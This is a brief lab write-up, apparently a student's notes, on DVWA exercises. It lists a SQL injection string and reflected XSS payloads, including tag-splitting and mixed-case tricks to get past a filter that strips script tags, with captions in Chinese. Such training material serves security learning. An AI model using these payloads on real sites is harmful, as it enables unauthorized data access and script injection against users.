## DVWA Security
### SQL injection:LOW
#### 瀏覽全部資料 1' or '1'='1
![image](https://github.com/kampfcl3/AI_2020/blob/main/security/pic/SQL%20injection1.png)
### XSS(Reflected): LOW
#### <b>aaa</>
![image](https://github.com/kampfcl3/AI_2020/blob/main/security/pic/xss(reflected)1.png)
#### 跑馬燈 <marquee/>hello</>
![image](https://github.com/kampfcl3/AI_2020/blob/main/security/pic/xss(reflected)2.png)
#### 跳視窗 <script>alert(/ya~/)</script>
![image](https://github.com/kampfcl3/AI_2020/blob/main/security/pic/xss(reflected)3.png)
#### XSS(Reflected): Medium
#### 1.跳視窗(錯位混淆) <sc<script>ript>alert(/xss/)</script>
```
erro畫面: <script>alert(/ya~/)</script>
```
![image](https://github.com/kampfcl3/AI_2020/blob/main/security/pic/xss(reflected)4.png)
```
中階會將<script>給砍掉變空白，所以可以利用錯位的方式去混淆，以達成目標
```
#### 2.跳視窗(大小寫混淆) <ScRipt>alert(/xss/)</script>
```
同跳視窗1，另用大小寫的方式去繞過檢測
```

